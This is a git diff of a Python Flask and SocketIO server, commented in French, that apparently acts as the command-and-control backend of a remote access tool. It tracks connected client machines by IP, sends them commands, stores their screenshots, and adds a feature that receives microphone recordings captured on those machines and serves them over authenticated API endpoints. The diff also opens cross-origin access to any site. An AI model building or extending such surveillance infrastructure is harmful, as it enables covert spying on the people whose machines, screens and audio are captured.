@@ -18,7 +18,7 @@ db.init_app(app)
 migrate = Migrate(app, db)
 jwt = JWTManager(app)
 
-socketio = SocketIO(app, max_size=10*1024*1024)
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', max_http_buffer_size=10 ** 8)
 
 authorizations = {
     'bearer_auth': {
@@ -36,10 +36,12 @@ auth_ns = api.namespace('api/v1/auth', description='Authentication operations')
 command_ns = api.namespace('api/v1/command', description='Command operations')
 clients_ns = api.namespace('api/v1/clients', description='Client operations')
 screenshot_ns = api.namespace('api/v1/screenshot', description='Screenshot operations')
+microphone_ns = api.namespace('api/v1/microphone', description='Microphone operations')
 
 auth_model = api.model('Auth', {'secret_key': fields.String(required=True, description='Clé secrète')})
 command_model = api.model('Command', {
-    'command': fields.String(required=True, description='Commande à exécuter')
+    'command': fields.String(required=True, description='Commande à exécuter'),
+    'params': fields.String(required=False, description='Paramètres de la commande')
 })
 client_model = api.model('Client', {
     'id': fields.Integer(required=True, description='ID du client'),
@@ -55,6 +57,11 @@ screenshots_model = api.model('Screenshots', {
     'id': fields.Integer(required=True, description='ID de la capture d\'écran'),
     'file_path': fields.String(required=True, description='Chemin du fichier de la capture d\'écran'),
     'date_created': fields.String(required=True, description='Date de création de la capture d\'écran')
+})
+microphone_model = api.model('Microphone', {
+    'id': fields.Integer(required=True, description='ID de l\'enregistrement audio'),
+    'file_path': fields.String(required=True, description='Chemin du fichier de l\'enregistrement audio'),
+    'date_created': fields.String(required=True, description='Date de création de l\'enregistrement audio')
 })
 
 client_params = api.parser()
@@ -81,9 +88,10 @@ class HandleCommand(Resource):
     def post(self, client_id):
         command_data = request.get_json()
         command = command_data.get('command')
+        duration = command_data.get('params')
         client = Client.query.get(client_id)
         if client and client.status == 'online':
-            socketio.emit('command', {'command': command}, room=client.sid)
+            socketio.emit('command', {'command': command, 'duration': duration}, room=client.sid)
             return {'status': 'success',
                     'message': f'Commande *{command}* envoyée au **client {client_id} / {client.ip}**.'}, 200
         elif client and client.status == 'offline':
@@ -134,6 +142,30 @@ class GetScreenshotImage(Resource):
             return {'status': 'error', 'message': 'Capture d\'écran non trouvée.'}, 404
 
 
+@microphone_ns.route('/client/<int:client_id>')
+class GetMicrophonesByClientId(Resource):
+    @jwt_required()
+    @api.doc(security='bearer_auth')
+    @microphone_ns.marshal_with(microphone_model, as_list=True)
+    def get(self, client_id):
+        microphones = Command.query.filter_by(client_id=client_id, type=CommandType.MICROPHONE).all()
+        for microphone in microphones:
+            microphone.date_created = microphone.date_created.strftime('%d/%m/%Y à %H:%M:%S')
+        return microphones, 200
+
+
+@microphone_ns.route('/audio/<int:microphone_id>')
+class GetMicrophoneAudio(Resource):
+    @jwt_required()
+    @api.doc(security='bearer_auth')
+    def get(self, microphone_id):
+        microphone = Command.query.get(microphone_id)
+        if microphone and os.path.exists(microphone.file_path):
+            return send_file(microphone.file_path, mimetype='audio/wav')
+        else:
+            return {'status': 'error', 'message': 'Enregistrement audio non trouvé.'}, 404
+
+
 @socketio.on('connect')
 def handle_connect():
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
@@ -174,6 +206,24 @@ def handle_screenshot(data):
         with open(screenshot_path, 'wb') as f:
             f.write(screenshot_bytes)
         new_command = Command(type=CommandType.SCREENSHOT, client_id=client.id, file_path=screenshot_path)
+        db.session.add(new_command)
+        db.session.commit()
+
+
+@socketio.on('audio_response')
+def handle_audio(data):
+    audio_bytes = base64.b64decode(data.get('audio'))
+    sid = request.sid
+    client = Client.query.filter_by(sid=sid).first()
+    if client:
+        client_ip = client.ip
+        audio_dir = f"audio/{client_ip}"
+        os.makedirs(audio_dir, exist_ok=True)
+        file_name = f"{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.wav"
+        audio_path = f"{audio_dir}/{file_name}"
+        with open(audio_path, 'wb') as f:
+            f.write(audio_bytes)
+        new_command = Command(type=CommandType.MICROPHONE, client_id=client.id, file_path=audio_path)
         db.session.add(new_command)
         db.session.commit()
 
